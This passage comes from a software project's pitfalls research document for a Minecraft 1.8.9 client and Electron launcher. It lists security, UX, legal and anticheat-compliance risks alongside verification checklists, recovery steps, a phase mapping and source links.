| Leaking the Azure AD client secret | Catastrophic — Microsoft revokes the app | Device code flow is a PUBLIC client — no client secret. If you ever see "client_secret" in Azure setup, you picked the wrong app type |
| Logging the accessToken | Leaks via crash reports, Discord pastes, GitHub gists | Redact at the logger level, not just at display |
| Writing cosmetics to user config without schema validation | Future cosmetic-backend update could inject arbitrary fields | Validate against a schema at read time, not just write time |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| MS device-code flow with manual copy-paste | User gets lost halfway, abandons login | One-click "open browser" + auto-copy code; poll with spinner |
| Cryptic XSTS error codes surfaced raw | "Login failed: 2148916233" means nothing to users | Translate every known XSTS code to plain English |
| No crash context on launcher errors | "Something went wrong" with no actionable info | Show sanitized stack trace + "copy to clipboard" button (sanitized!) |
| Allocating 16GB RAM tooltip-less | User makes their game slower with no warning | Slider cap 4GB; explain GC pause tradeoff inline |
| Install flow requires Java install | "Why do I need Java?" — loses users | Bundle the JRE (already scoped); never prompt for system Java |
| Launcher takes 10s to show UI | Feels broken | Render shell immediately; hydrate data async; show skeletons |
| Bundled JRE downloads on first launch | Long first-run wait, no feedback | Either bundle in installer OR show a progress bar with byte counts |
| Forced update on launch with no changelog | Users feel loss of control | Show a "What's new in v0.X.Y" dialog; allow "skip this version" for minor updates |
| Cosmetics load order visibly changes in-game | Looks buggy | Preload cosmetic textures during launch, not at first render |
| Anticheat-unsafe mod shipped with no warning | User gets banned, blames us | Every feature shipped has an explicit "safe on Hypixel/BlocksMC" label (true for all v0.1 features by design) |

---

## "Looks Done But Isn't" Checklist

- [ ] **Microsoft auth:** Token refresh tested after 7+ days of inactivity (not just fresh login). Verify `invalid_grant` path re-prompts device code cleanly.
- [ ] **MS auth error UX:** Every XSTS error code (`2148916233`, `2148916235`, `2148916238`, `2148916236`, `2148916237`) has a user-facing translation.
- [ ] **Bundled JRE:** Works on a clean machine without a system Java install. Test on a fresh Windows install AND a fresh macOS install (VM or second user account).
- [ ] **macOS Gatekeeper:** App launches on a clean macOS install with only the documented right-click-Open workaround (v0.1, unsigned) — not blocked entirely.
- [ ] **Forge+Mixin:** Our mod coexists with Patcher + Optifine installed simultaneously. No crashes, no silent Mixin-skip.
- [ ] **Anticheat:** Every in-game feature verified on a throwaway Hypixel account over 2+ hours of play. No kick, no ban warning.
- [ ] **Hypixel handshake:** Our MODID doesn't appear on any published Hypixel blacklist. Test: log into Hypixel with mod installed, stay connected through a lobby switch.
- [ ] **Crash report sanitization:** A real crash containing a real accessToken is sanitized before displayed AND before copy-to-clipboard.
- [ ] **RAM slider:** Cap enforced at 4GB; GC args use G1GC not CMS.
- [ ] **FPS benchmark:** Reproduced on at least 3 different machines with < 10% variance in p95 frametime.
- [ ] **Launcher IPC:** `nodeIntegration: false`, `contextIsolation: true`, `sandbox: true` in BrowserWindow config. Confirmed with Electron Fuses or a manual renderer `process === undefined` check.
- [ ] **Token storage:** Refresh token in OS keychain, not JSON. Verified by reading the filesystem — no token-looking string in any file in `%APPDATA%\wiiwho`.
- [ ] **Jar integrity:** Vanilla 1.8.9 jar SHA-1 verified against Mojang manifest after download. Verify by corrupting the jar and confirming launch refuses.
- [ ] **Log rotation:** Logs don't grow unbounded. Test: simulate 1000 launch cycles; confirm disk use stays bounded.
- [ ] **Config migration:** A v0.1 config loads cleanly on a hypothetical v0.2 config loader. Dry-run this before shipping v0.1.
- [ ] **Cosmetic pipeline end-to-end:** Placeholder cape renders for our account's Minecraft UUID, not just "in preview." Tested in a real server.
- [ ] **Anticheat doc exists:** Every v0.1 feature listed in `ANTICHEAT-SAFETY.md` with a review signoff.
- [ ] **Legal:** No Mojang-derived assets in the source tree. Placeholder cape provenance documented.

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Gradle/ForgeGradle toolchain broken | LOW | Reset to known-good template; copy src code over; don't debug the toolchain |
| Mixin conflict discovered late | MEDIUM | Raise priority OR switch from `@Redirect` to `@Inject`; worst-case gate the patch behind an "Optifine not present" check |
| Watchdog ban on owner's account | HIGH | Appeal via Hypixel support (slow); in parallel, audit feature list against Hypixel policy; remove offender; release emergency patch |
| Microsoft auth widely broken (e.g. Azure AD client ID revoked) | HIGH | Register new Azure AD app; ship a launcher update that migrates existing users through a re-login flow |
| Mojang C&D | HIGH | Immediately halt distribution; remove offending asset/feature; public apology; re-release clean version — depending on severity, may require abandoning the brand |
| Perf claim disputed publicly | MEDIUM | Publish benchmark artifact + methodology; invite reproduction; retract claim if reproduction fails |
| Crash leaks a token | MEDIUM | Rotate the user's MS token (re-login); ship sanitization patch immediately; post-mortem documenting the leak path |
| Config file breaks on upgrade | LOW-MEDIUM | Ship a one-off migration binary; if not possible, guide users to delete config (lose settings, keep account) |
| Bundled JRE rejected by Gatekeeper | MEDIUM | Re-sign with a signed upstream JRE (Zulu/Corretto); if unsigned v0.1 chose this path, document the right-click-Open workaround prominently |
| Mixin silently not applying | MEDIUM | Add Mixin audit logging; test with `-Dmixin.debug.verbose=true`; usually traces to priority or selector signature mismatch |
| electron-builder Windows installer flagged by SmartScreen | LOW (expected, personal-use) | Document SmartScreen "More info → Run anyway" flow in install guide; plan OV code signing for Phase 5 if pursuing public release |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| 1. Gradle/ForgeGradle toolchain | Phase 1 (mod scaffold) | `./gradlew build` succeeds from scratch on Windows + macOS |
| 2. Anticheat-unsafe features | Every phase shipping an in-game feature; process established Phase 1 | 2-hour Hypixel play test on alt per release |
| 3. Legal/EULA violation | Phase 0 (pre-code policy) + Phase 2 (jar download) | CI check for Mojang-signed bytes in `dist/`; asset-provenance doc exists |
| 4. Mixin conflicts | Phase 1 (mod scaffold); reverified in Phase 3 (perf) | Test matrix: ours + Patcher + Optifine loaded together, no crash, no silent skip |
| 5. Electron IPC RCE | Phase 2 (launcher scaffold) | BrowserWindow config review; renderer has no `require()` access; no user-string-to-spawn path |
| 6. MS auth token handling | Phase 2 (auth flow) | 7-day refresh test; XSTS error code translations present; token in OS keychain not JSON |
| 7. Perf benchmark reproducibility | Phase 3 (FPS work) | Reference scene doc committed; 3-machine reproduction with < 10% p95 variance |
| 8. Crash report PII leak | Phase 2 (crash viewer) | Fake-crash test with fake token shows sanitized output |
| 9. macOS Gatekeeper | Phase 4 (packaging) | Clean-machine install test |
| 10. Config format drift | Phase 2 (config write) | `configVersion` field present; migration function exists (even if no-op in v0.1) |
| 11. JVM heap mis-allocation | Phase 2 (RAM slider) | Slider capped 4GB; default 2GB; G1GC args |
| 12. MODID collision | Phase 1 | Search CurseForge/Modrinth/Hypixel for chosen MODID |
| 13. MCP mapping drift | Phase 1 | Pinned `stable_22`; build.gradle committed |
| 14. Optifine incompatibility | Phase 3 (FPS) | Test matrix coverage |
| 15. Fullscreen perf regression | Phase 3 (FPS) | Benchmark both modes |
| 16. Electron-Node ABI mismatch | Phase 2 (launcher scaffold) | `@electron/rebuild` in CI; prefer `safeStorage` over `keytar` |
| 17. Log growth | Phase 2 (launch flow) | Rotation logic + size cap |
| 18. Installer cleanup | Phase 4 (packaging) | Multi-install test on clean VM |
| 19. Placeholder cosmetic rights | Phase 3 (cosmetic pipeline) | Provenance doc for every asset shipped |
| 20. Launcher↔mod version skew | Phase 2 (launch flow) | Explicit protocol-version byte in handoff |

---

## Sources

Official / authoritative:
- [Mojang EULA](https://www.minecraft.net/en-us/eula) — redistribution + monetization rules
- [Mojang Usage Guidelines](https://www.minecraft.net/en-us/usage-guidelines) — brand distance / "too official" concern
- [Minecraft EULA updates (Mojang)](https://www.minecraft.net/en-us/article/minecraft-eula-and-commercial-usage-guidelines-updates) — 2025/2026 EULA clarifications
- [Microsoft authentication (Minecraft Wiki)](https://minecraft.wiki/w/Microsoft_authentication) — full MS → XBL → XSTS → Minecraft token chain
- [Microsoft Authentication Scheme (wiki.vg)](https://wiki.vg/Microsoft_Authentication_Scheme) — XSTS error codes and detailed flow
- [OAuth 2.0 device authorization grant (Microsoft Learn)](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code) — device code flow specifics
- [MSAL authentication flows (Microsoft Learn)](https://learn.microsoft.com/en-us/entra/identity-platform/msal-authentication-flows)
- [Electron Context Isolation](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [Electron Security](https://www.electronjs.org/docs/latest/tutorial/security)
- [Electron Process Sandboxing](https://www.electronjs.org/docs/latest/tutorial/sandbox/)
- [Electron safeStorage API](https://www.electronjs.org/docs/latest/api/safe-storage)
- [About the Hypixel Watchdog System (Hypixel Support)](https://support.hypixel.net/hc/en-us/articles/360019613300-About-the-Hypixel-Watchdog-System)
- [Watchdog Cheat Detection (Hypixel Wiki)](https://hypixel.fandom.com/wiki/Watchdog_Cheat_Detection)
- [Mixins on Minecraft Forge (SpongePowered/Mixin Wiki)](https://github.com/SpongePowered/Mixin/wiki/Mixins-on-Minecraft-Forge)
- [Mixin 0.8 Release Notes](https://github.com/SpongePowered/Mixin/wiki/Release-Notes---Mixin-0.8)
- [electron/notarize (GitHub)](https://github.com/electron/notarize) — macOS notarization

Community / reference projects:
- [Sk1erLLC/Patcher (GitHub)](https://github.com/Sk1erLLC/Patcher) — canonical 1.8.9 performance-mod reference
- [Patcher mod page (Sk1er)](https://sk1er.club/mods/patcher)
- [manuthebyte/template-forge-mixin-1.8.9](https://github.com/manuthebyte/template-forge-mixin-1.8.9) — known-good Mixin-on-Forge-1.8.9 template
- [Mixin 0.7-0.8 Compatibility (CurseForge)](https://www.curseforge.com/minecraft/mc-mods/mixin-0-7-0-8-compatibility)
- [UniMixins (Modrinth)](https://modrinth.com/mod/unimixins) — Mixin bootstrap with 1.8.9 support
- [Performance mods 1.8.9 and below (community gist)](https://gist.github.com/NordicGamerFE/3394b115e34639376aee9c5e2d11a2ba)

Community pitfall evidence (Hypixel forums — behavioral patterns, not authoritative):
- [Freelook and the line on allowed mods (Hypixel Forums)](https://hypixel.net/threads/short-quickly-made-thread-how-the-freelook-ban-changes-the-line-on-what-mods-are-allowed-and-not-allowed.4486273/)
- [Freelook detection (Hypixel Forums)](https://hypixel.net/threads/okay-so-hypixel-can-detect-freelook.4490254/)
- [Safe mods on 1.8.9 Hypixel](https://hypixel.net/threads/safe-mods-on-1-8-9-hypixel.4288433/)
- [Forge 1.8.9 Gradle 8.2.1 (Hypixel Forums)](https://hypixel.net/threads/using-gradle-8-2-1-to-make-a-1-8-9-forge-mod.5446816/)
- [Forge 1.8.9 Gradle 7.4.2 (Hypixel Forums)](https://hypixel.net/threads/1-8-9-forge-using-gradle-7-4-2.5111685/)
- [Forge 1.8.9 ForgeGradle resolution (Hypixel Forums)](https://hypixel.net/threads/resolved-setting-up-forgegradle-for-1-8-9%E2%80%94-could-not-find-com-github-asbyth-forgegradle-6f53277.5050808/)

Industry context:
- [Lunar Client acquires Badlion Client](https://www.lunarclient.com/news/lunar-client-acquires-badlion-client) — Lunar is the dominant player as of 2025, confirming Electron-launcher pattern
- [Lunar Client Terms of Service](https://www.lunarclient.com/terms) — reference for how a real client handles Mojang-boundary language
- [Windows SmartScreen reputation docs (Microsoft)](https://learn.microsoft.com/en-us/archive/blogs/ie/microsoft-smartscreen-extended-validation-ev-code-signing-certificates)

---

*Pitfalls research for: Lunar-class Minecraft 1.8.9 client (WiiWho)*
*Researched: 2026-04-20*
